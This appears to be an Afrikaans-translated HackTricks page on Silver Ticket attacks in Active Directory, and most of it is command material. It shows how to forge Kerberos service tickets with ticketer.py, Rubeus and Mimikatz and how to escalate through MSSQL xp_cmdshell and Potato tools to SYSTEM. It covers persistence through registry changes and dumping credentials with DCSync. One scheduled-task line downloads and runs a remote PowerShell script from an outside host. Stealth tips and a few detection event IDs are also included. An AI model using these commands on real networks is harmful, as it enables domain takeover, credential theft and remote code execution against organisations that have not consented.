# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Die **Silver Ticket**-aanval behels die uitbuiting van service tickets in Active Directory (AD)-omgewings. Hierdie metode maak staat op die **verkryging van die NTLM-hash van 'n service account**, soos 'n computer account, om 'n Ticket Granting Service (TGS)-ticket te vervals. Met hierdie vervalste ticket kan 'n aanvaller toegang tot spesifieke services op die netwerk verkry en **enige gebruiker naboots**, gewoonlik met die doel om administratiewe voorregte te verkry. Daar word beklemtoon dat die gebruik van AES-keys vir die vervalsing van tickets veiliger en moeiliker om op te spoor is.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Tickets is moeiliker om op te spoor as Golden Tickets omdat hulle slegs die **hash van die service account** vereis, nie die krbtgt-account nie. Hulle is egter beperk tot die spesifieke service wat hulle teiken. Boonop is dit genoeg om slegs 'n gebruiker se password te steel.
Boonop, as jy 'n **account se password met 'n SPN** kompromitteer, kan jy daardie password gebruik om 'n Silver Ticket te skep wat enige gebruiker teenoor daardie service naboots.

### Moderne Kerberos-veranderinge (slegs-AES-domeine)

- Windows-opdaterings wat op **8 November 2022 (KB5021131)** begin het, stel service tickets by verstek op **AES session keys** wanneer moontlik, en faseer RC4 uit. Daar word verwag dat DCs teen middel-**2026** met RC4 **by verstek gedeaktiveer** sal word, dus misluk dit toenemend om op NTLM/RC4-hashes vir silver tickets staat te maak met `KRB_AP_ERR_MODIFIED`. Onttrek altyd **AES-keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) vir die geteikende service account.<sup>[[5]](#references)</sup>
- Indien die service account se `msDS-SupportedEncryptionTypes` tot AES beperk is, moet jy met `/aes256` of `-aesKey` forgeer; RC4 (`/rc4` of `-nthash`) sal nie werk nie, selfs al beskik jy oor die NTLM-hash.<sup>[[6]](#references)</sup>
- gMSA/computer accounts roteer elke 30 dae; dump die **huidige AES-key** vanaf LSASS, Secretsdump/NTDS of DCsync voordat jy forgeer.
- OPSEC: die verstek-leeftyd van tickets in tools is dikwels **10 jaar**; stel realistiese tydsduur in (bv. `-duration 600` minute) om opsporing weens abnormale leeftye te vermy.<sup>[[6]](#references)</sup>

Vir die skep van tickets word verskillende tools gebruik, afhangend van die bedryfstelsel:

### Op Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Op Windows
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Die CIFS-diens word uitgelig as 'n algemene teiken vir toegang tot die lêerstelsel van die slagoffer, maar ander dienste soos HOST en RPCSS kan ook vir take en WMI-navrae uitgebuit word.

### Voorbeeld: MSSQL-diens (MSSQLSvc) + Potato na SYSTEM

As jy die NTLM hash (of AES key) van 'n SQL-diensrekening (bv. sqlsvc) het, kan jy 'n TGS vir die MSSQL SPN forge en enige gebruiker teenoor die SQL-diens impersonate. Aktiveer van daar af xp_cmdshell om commands as die SQL-diensrekening uit te voer. As daardie token SeImpersonatePrivilege het, chain jy 'n Potato om na SYSTEM te elevate.<sup>[[4]](#references)</sup>
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Indien die resulterende konteks SeImpersonatePrivilege het (dikwels waar vir diensrekeninge), gebruik ’n Potato-variant om SYSTEM te verkry:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Meer besonderhede oor misbruik van MSSQL en die aktivering van xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Oorsig van Potato techniques:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Beskikbare Dienste

| Dienssoort                                | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Afhangend van die OS ook:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In sommige gevalle kan jy net vra vir: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, ook psexec            | CIFS                                                                       |
| LDAP operations, insluitend DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Deur **Rubeus** te gebruik, kan jy **al** hierdie tickets aanvra met die parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon
- **Geen voorafgaande 4768/4769 op die DC** vir dieselfde client/service is 'n algemene aanduiding dat 'n vervalste TGS direk aan die diens aangebied word.
- 'n Buitensporig lang ticket-l leeftyd of onverwagte encryption type (RC4 wanneer die domein AES afdwing) staan ook uit in 4769/4624-data.

## Persistence

Om te voorkom dat masjiene hul password elke 30 dae roteer, stel `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` in, of jy kan `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` op 'n groter waarde as 30 dae stel om die rotasieperiode aan te dui wanneer die masjien se password geroteer moet word.<sup>[[3]](#references)</sup>

## Misbruik van Service tickets

In die volgende voorbeelde veronderstel ons dat die ticket verkry is deur die administrator-account te impersonate.

### CIFS

Met hierdie ticket sal jy toegang tot die `C$`- en `ADMIN$`-folder via **SMB** hê (indien hulle exposed is) en lêers na 'n deel van die remote filesystem kan kopieer deur eenvoudig iets soos die volgende te doen:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Jy sal ook 'n shell binne die host kan verkry of arbitrêre commands met **psexec** kan uitvoer:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Met hierdie toestemming kan jy geskeduleerde take op afgeleë rekenaars genereer en arbitrêre commands uitvoer:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Met hierdie tickets kan jy **WMI op die slagoffer se stelsel uitvoer**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Vind **meer inligting oor wmiexec** op die volgende bladsy:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Met winrm-toegang tot ’n rekenaar kan jy **dit benader** en selfs ’n PowerShell kry:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Kyk na die volgende bladsy om **meer maniere te leer om met ’n remote host te verbind deur winrm te gebruik**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Let daarop dat **winrm aktief moet wees en op die remote rekenaar moet luister** om toegang daartoe te verkry.

### LDAP

Met hierdie privilege kan jy die DC-databasis met **DCSync** dump:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Leer meer oor DCSync** op die volgende bladsy:


{{#ref}}
dcsync.md
{{#endref}}


## Verwysings

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Hoe om Kerberos aan te val? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Masjienrekeningwagwoordproses - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + Potato-pad](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Kerberos-verharding en RC4-depresiasie](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Impacket ticketer.py huidige opsies (AES/keytab/duur)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)

{{#include ../../banners/hacktricks-training.md}}
